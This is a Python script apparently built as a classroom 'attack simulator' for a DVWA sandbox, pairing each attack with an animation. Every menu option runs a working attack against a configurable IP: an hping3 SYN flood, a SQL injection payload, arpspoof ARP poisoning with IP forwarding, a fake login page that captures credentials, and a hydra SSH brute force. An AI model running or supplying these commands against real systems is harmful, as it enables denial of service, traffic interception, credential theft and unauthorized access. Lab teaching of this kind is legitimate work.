# main.py
import os
import time
import subprocess
import requests
import http.server
import socketserver

# Configuration (adjust these based on your sandbox setup)
VICTIM_IP = "192.168.1.10"  # Victim VM IP
GATEWAY_IP = "192.168.1.1"  # Router/Default Gateway IP
VICTIM_URL = f"http://{VICTIM_IP}/dvwa/vulnerabilities/sqli/"
LOGIN_URL = f"http://{VICTIM_IP}/dvwa/login.php"
USERNAME = "user"  # Victim SSH username (configure SSH on victim)
PORT = 8080  # Port for phishing server

# DDoS Attack
def run_ddos():
    print("Starting DDoS Attack...")
    print("Step 1: Sending SYN packets to overwhelm the server.")
    os.system(f"hping3 -S -p 80 --flood {VICTIM_IP} &")
    subprocess.Popen(["manim", "-pql", "ddos_animation.py", "DDoSAnimation"])
    time.sleep(5)
    print("Step 2: Server under heavy load...")
    time.sleep(5)
    os.system("pkill hping3")
    print("DDoS stopped.")

# SQL Injection Attack
def login_to_dvwa():
    session = requests.Session()
    data = {"username": "admin", "password": "password", "Login": "Login"}
    session.post(LOGIN_URL, data=data)
    return session

def run_sql_injection():
    session = login_to_dvwa()
    print("Starting SQL Injection Attack...")
    print("Step 1: Sending malicious input.")
    payload = {"id": "1' OR '1'='1", "Submit": "Submit"}
    response = session.get(VICTIM_URL, params=payload)
    subprocess.Popen(["manim", "-pql", "sql_injection_animation.py", "SQLInjectionAnimation"])
    time.sleep(2)
    print("Step 2: Data extracted:", response.text[200:400])
    time.sleep(2)
    print("SQL Injection complete.")

# MITM Attack
def run_mitm():
    print("Starting MITM Attack...")
    print("Step 1: Enabling IP forwarding.")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("Step 2: Poisoning ARP tables.")
    os.system(f"arpspoof -i eth0 -t {VICTIM_IP} {GATEWAY_IP} &")
    os.system(f"arpspoof -i eth0 -t {GATEWAY_IP} {VICTIM_IP} &")
    subprocess.Popen(["manim", "-pql", "mitm_animation.py", "MITMAnimation"])
    time.sleep(5)
    print("Step 3: Traffic intercepted.")
    time.sleep(5)
    os.system("pkill arpspoof")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("MITM stopped.")

# Phishing Attack
class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"Step 2: Credentials captured - {post_data}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Login successful (simulated)")

def run_phishing():
    print("Starting Phishing Attack...")
    print("Step 1: Hosting fake login page at http://localhost:8080")
    with open("index.html", "w") as f:
        f.write("""
        <!DOCTYPE html>
        <html>
        <head><title>Fake Login</title></head>
        <body>
            <h2>Login</h2>
            <form method="POST">
                Username: <input type="text" name="username"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit" value="Login">
            </form>
        </body>
        </html>
        """)
    subprocess.Popen(["manim", "-pql", "phishing_animation.py", "PhishingAnimation"])
    Handler = PhishingHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("Visit http://localhost:8080 and submit the form.")
        time.sleep(10)  # Simulate victim interaction
        httpd.shutdown()
    print("Phishing demo complete.")

# Brute Force Attack
def run_brute_force():
    print("Starting Brute Force Attack...")
    print("Step 1: Attempting to guess SSH password.")
    with open("passwords.txt", "w") as f:
        f.write("password\n123456\nadmin\ntest\n")
    subprocess.Popen(["manim", "-pql", "brute_force_animation.py", "BruteForceAnimation"])
    os.system(f"hydra -l {USERNAME} -P passwords.txt ssh://{VICTIM_IP} -t 4")
    time.sleep(5)
    print("Step 2: Password found (simulated: 'test').")
    time.sleep(2)
    print("Brute Force complete.")

# Main Menu
def main():
    while True:
        print("\nCybersecurity Attack Simulator")
        print("1: DDoS Attack")
        print("2: SQL Injection")
        print("3: MITM Attack")
        print("4: Phishing Attack")
        print("5: Brute Force Attack")
        print("6: Exit")
        choice = input("Select an attack: ")
        
        if choice == "1":
            run_ddos()
        elif choice == "2":
            run_sql_injection()
        elif choice == "3":
            run_mitm()
        elif choice == "4":
            run_phishing()
        elif choice == "5":
            run_brute_force()
        elif choice == "6":
            print("Exiting...")
            break
        else:
            print("Invalid choice.")

if __name__ == "__main__":
    main()